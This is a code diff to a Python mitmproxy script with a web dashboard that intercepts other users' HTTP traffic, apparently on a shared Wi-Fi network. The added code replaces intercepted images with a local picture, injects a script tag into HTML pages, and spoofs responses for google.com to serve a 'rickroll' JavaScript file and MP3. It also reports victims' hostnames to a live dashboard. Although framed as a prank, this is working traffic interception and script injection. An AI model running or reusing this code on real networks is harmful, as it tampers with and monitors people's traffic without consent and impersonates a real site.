@@ -3,11 +3,16 @@ import random
 import socket
 import threading
 import re
+import cStringIO
+from io import BytesIO
 import tornado.ioloop
 import tornado.web
 import tornado.wsgi
 import tornado.websocket
+from PIL import Image
 from flask import Flask, send_from_directory
+from libmproxy.protocol.http import decoded, HTTPResponse
+from netlib.odict import ODictCaseless
 
 app = Flask("mitm", static_folder="client/app", static_url_path="")
 app_wsgi = tornado.wsgi.WSGIContainer(app)
@@ -57,7 +62,16 @@ class WebSocketHandler(tornado.websocket.WebSocketHandler):
         WebSocketHandler.clients.remove(self)
 
 
+image_src = None
+
+def parse_image(d):
+    global image_src
+    s = BytesIO(d)
+    image_src = Image.open(s)
+
 def start(ctx, argv):
+    with open("wifi.jpg","rb") as f:
+        parse_image(f.read())
     global tornado_app, tornado_thread
     tornado_app = tornado.web.Application([
         (r'/events', WebSocketHandler),
@@ -116,15 +130,64 @@ def response(ctx, flow):
     print "Received flow: %s" % flow
 
     is_image = (
-        (re.search(r"jpe?g|png|gif|webm", flow.request.path) or
+        (re.search(r"(jpe?g|png|gif|webm)$", flow.request.path) or
         "image" in flow.response.headers.get_first("content-type", ""))
         and flow.response.content
     )
     if is_image:
         handle_image(flow)
 
+    is_html = (
+        (re.search(r"(html?|php|cgi)$", flow.request.path) or
+        "html" in flow.response.headers.get_first("content-type", ""))
+        and flow.response.content
+        and "youtube" not in flow.request.pretty_host(hostheader=True)
+    )
+    if is_html:
+        handle_html(flow)
+
+
 def handle_image(flow):
     WebSocketHandler.broadcast("image", dict(
         src=gethostbyaddr(flow.client_conn.address.host),
         dst=gethostbyaddr(flow.server_conn.address.host),
         imageURL="/image/%s" % flow.id))
+    s = BytesIO(flow.response.content)
+    img = Image.open(s)
+
+    global image_src
+    dst = image_src.copy()
+    dst.thumbnail(img.size, Image.ANTIALIAS)
+
+    s = BytesIO()
+    dst.save(s, format="png")
+
+    flow.response.content = s.getvalue()
+    flow.response.headers["content-type"] = ["image/png"]
+
+
+do_rick = True
+
+def handle_html(flow):
+    global do_rick
+    if do_rick:
+        rick_iframe = """<script type="text/javascript" src="//google.com/rick_js"></script>"""
+        with decoded(flow.response):
+            flow.response.content = re.sub("<body(.*?)>", r"<body\1>" + rick_iframe, flow.response.content, count=1)
+
+
+with open("rick.js", "rb") as f:
+    rick_js = f.read()
+with open("rick.mp3", "rb") as f:
+    rick_mp3 = f.read()
+
+
+
+def request(ctx, flow):
+    if flow.request.pretty_host(hostheader=True) == "google.com":
+        if flow.request.path == "/rick_js":
+            print "rick"
+            flow.reply(HTTPResponse([1, 1], 200, "OK", ODictCaseless([["content-type","text/javascript"]]), rick_js))
+        if flow.request.path == "/rick_mp3":
+            print "mp3"
+            flow.reply(HTTPResponse([1, 1], 200, "OK", ODictCaseless([["content-type", "audio/mpeg"]]), rick_mp3))
